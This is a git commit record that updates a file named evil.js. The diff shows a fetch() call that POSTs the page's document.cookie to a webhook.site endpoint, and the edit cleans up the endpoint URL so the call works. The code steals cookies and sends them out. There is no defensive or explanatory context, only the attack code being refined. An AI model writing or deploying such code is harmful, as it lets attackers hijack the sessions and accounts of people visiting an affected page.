9e6e8d20cf1ab06fb71ce8dff6fe3413ec684476
manoroxerio <tomas.surf777@gmail.com>
2025-12-07 12:50:47 +0000

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,4 +1,4 @@
-fetch(" 	https://webhook.site/2141939d-e3f6-43b2-902e-35080b6310c2?c", {
+fetch("https://webhook.site/2141939d-e3f6-43b2-902e-35080b6310c2", {
   method: "POST",
   headers: { "Content-Type": "text/plain" },
   body: document.cookie
